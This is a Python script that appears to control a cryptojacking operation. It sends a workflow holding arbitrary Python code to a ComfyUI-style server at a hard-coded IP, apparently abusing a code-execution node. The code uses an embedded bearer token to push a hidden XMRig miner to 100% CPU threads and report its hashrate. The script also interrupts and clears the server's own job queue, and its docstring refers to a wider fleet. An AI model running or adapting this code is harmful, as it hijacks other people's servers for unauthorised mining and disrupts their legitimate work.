"""Immediately set XMRig on 59.34.28.50 back to 100% threads (no fleet redeploy)."""
import json
import time
import urllib.request

BASE = "http://59.34.28.50:8188"

CODE = r'''
import json, urllib.request, time
lines = []
try:
    get_req = urllib.request.Request(
        "http://127.0.0.1:44880/1/config",
        headers={
            "Accept": "application/json",
            "Authorization": "Bearer ce_xm_2026",
        },
    )
    with urllib.request.urlopen(get_req, timeout=5) as r:
        cfg = json.loads(r.read())
    old = cfg.get("cpu", {}).get("max-threads-hint", "?")
    if "cpu" in cfg:
        cfg["cpu"]["max-threads-hint"] = 100
    payload = json.dumps(cfg).encode()
    put_req = urllib.request.Request(
        "http://127.0.0.1:44880/1/config",
        data=payload,
        method="PUT",
        headers={
            "Content-Type": "application/json",
            "Authorization": "Bearer ce_xm_2026",
        },
    )
    with urllib.request.urlopen(put_req, timeout=5):
        pass
    lines.append("max_threads_hint " + str(old) + " -> 100")
    time.sleep(3)
    s_req = urllib.request.Request(
        "http://127.0.0.1:44880/2/summary",
        headers={"Authorization": "Bearer ce_xm_2026"},
    )
    with urllib.request.urlopen(s_req, timeout=5) as r:
        s = json.loads(r.read())
    hr = s.get("hashrate", {}).get("total", [])
    lines.append("hr=" + str(hr))
except Exception as e:
    lines.append("err=" + str(e)[:200])
result = chr(10).join(lines)
'''

nodes = {
    "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
    "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
}
body = json.dumps(
    {
        "prompt": nodes,
        "extra_data": {
            "extra_pnginfo": {
                "workflow": {
                    "nodes": [
                        {"id": 1, "type": "IDENode"},
                        {"id": 2, "type": "PreviewTextNode"},
                    ]
                }
            }
        },
    }
).encode()

for path in ("/api/interrupt", "/interrupt"):
    try:
        urllib.request.urlopen(
            urllib.request.Request(
                BASE + path, data=b"{}", method="POST",
                headers={"Content-Type": "application/json"},
            ),
            timeout=10,
        )
    except Exception:
        pass
try:
    urllib.request.urlopen(
        urllib.request.Request(
            BASE + "/queue",
            data=json.dumps({"clear": True}).encode(),
            method="POST",
            headers={"Content-Type": "application/json"},
        ),
        timeout=10,
    )
except Exception:
    pass

time.sleep(2)
with urllib.request.urlopen(
    urllib.request.Request(
        f"{BASE}/prompt", data=body, method="POST",
        headers={"Content-Type": "application/json"},
    ),
    timeout=30,
) as r:
    resp = json.loads(r.read())
pid = resp.get("prompt_id")
print("prompt_id", pid)
time.sleep(12)
for _ in range(15):
    h = json.loads(urllib.request.urlopen(f"{BASE}/history/{pid}", timeout=20).read())
    outs = h.get(pid, {}).get("outputs", {})
    texts = []
    for nout in outs.values():
        for v in nout.values():
            if isinstance(v, list):
                texts.extend(str(x) for x in v)
            elif isinstance(v, str):
                texts.append(v)
    if texts:
        print("\n".join(texts))
        break
    time.sleep(2)

time.sleep(8)
st = json.loads(
    urllib.request.urlopen(
        urllib.request.Request(
            "http://59.34.28.50:8188/api/enhanced/stats",
            headers={"User-Agent": "Mozilla/5.0"},
        ),
        timeout=15,
    ).read()
)
cpu = (st.get("stats") or {}).get("cpu") or {}
print("dashboard hr_now:", cpu.get("hashrate_now"))
